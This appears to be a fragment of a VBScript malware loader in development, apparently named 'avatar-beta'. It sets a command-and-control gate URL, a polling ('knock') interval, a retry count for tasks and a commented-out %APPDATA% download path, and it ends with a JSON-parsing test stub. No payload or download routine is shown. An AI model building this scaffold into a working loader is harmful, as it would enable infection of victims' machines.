'Loader version
Dim version
version = "0.9.7"

'Server
Dim server
server = "http://localhost/avatar-beta/server/gate.php"

'Interval between knocks in seconds
Dim interval
interval = 10

'How many times repeat failed task
Dim attemptsCount
attemptsCount = 3

'Status of running loader
Dim status
status = "Active"

'Path for download files
'Set shellObj = new ActiveXObject "WScript.Shell"
'Set defaultPath = shellObj.ExpandEnvironmentStrings("%APPDATA%")
Dim json, obj
json = "{a:""aaa"", b:{ name:""bb"", value:""text"" }, c:[""item0"", ""item1"", ""item2""]}" 
Set obj = parseJSON(json)
WScript.Echo obj.a